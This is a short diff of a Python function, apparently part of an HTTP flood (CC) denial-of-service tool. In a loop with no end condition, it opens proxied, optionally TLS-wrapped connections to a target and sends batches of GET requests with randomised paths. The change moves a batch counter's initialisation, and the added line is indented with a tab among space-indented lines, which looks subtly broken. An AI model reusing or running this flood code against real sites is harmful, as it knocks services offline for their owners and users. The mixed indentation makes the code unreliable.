@@ -614,6 +614,7 @@ def cc(event, proxy_type):
 
     while True:
         s = None
+	sent_count_in_batch = 0
         try:
             # 1. 建立一个长连接
             s = socks.socksocket()
@@ -634,7 +635,6 @@ def cc(event, proxy_type):
                 s = ctx.wrap_socket(s, server_hostname=target)
 
             # 2. 在这个连接上批量发送请求
-            sent_count_in_batch = 0
             for _ in range(BATCH_SIZE):
                 try:
                     get_host = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
